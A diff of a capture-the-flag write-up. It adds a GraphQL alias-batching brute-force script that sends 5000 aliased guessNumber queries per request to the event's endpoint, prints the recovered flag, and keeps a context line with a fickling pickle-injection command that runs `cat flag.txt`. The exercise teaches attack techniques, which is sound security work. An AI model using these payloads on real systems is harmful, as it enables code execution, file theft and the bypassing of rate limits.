@@ -240,7 +240,7 @@ fickling --inject "int(__import__('os').popen('cat flag.txt').read())" portfolio
 
  ```graphql
 query {
-     guessNumber(number: ${number}) {
+     guessNumber(number: 10) {
          correct
          message
          flag
@@ -252,7 +252,7 @@ query {
 
 ```graphql
 query {
-   first1: guessNumber(number: ${number}) {
+   first1: guessNumber(number: 10) {
      correct
      message
      flag
@@ -265,7 +265,44 @@ query {
 }
 ```
 
--
+- After testing it, I noticed that the server can handle only `5000` aliases.I tried `10000` aliases at first and 502 gateway error.I wrote a script to make it easier because I can't manually create 5000 aliases.
+
+```python3
+#! /usr/bin/env python3
+import requests
+import asyncio
+
+pre_data = "query {\n  me: guessNumber(number: 100000) {\n    correct\n    message\n    flag\n  }"
+end_data = "}\n\n"
+
+async def createData(min: int,max: int) -> str:
+    main_data = "" + pre_data
+    for i in range(min-1,max):
+        data = "\nmezz: guessNumber(number: zz) {\n    correct\n    message\n    flag\n  }\n".replace("zz",str(i))
+        main_data += data 
+    return main_data + end_data
+
+async def main():
+    for i in range(0,100000,5000):
+        data = {"query":await createData(i,i+5000)}
+        url = "https://abfb9883.bsidesmumbai.in/graphql"
+        data = requests.post(url,json=data)
+        if "BMCTF" in data.text:
+            print(f"[+] Range-:{i}:{i+5000}")
+            print("[+] Flag-: BMCTF{"+data.text.split("BMCTF{")[1].split("\"")[0])
+            exit()
+        else:
+            print(f"[-] Not in range-:{i}:{i+5000}")
+
+if __name__ == "__main__":
+    asyncio.run(main())
+```
+
+- Flag-: ```BMCTF{4l14s_br34k_l1m1ts}```
+
+![image](https://github.com/user-attachments/assets/eb9ff88c-11f0-4e79-b6bd-3ae79fe1ef1b)
+
+-----------------
 
 
 
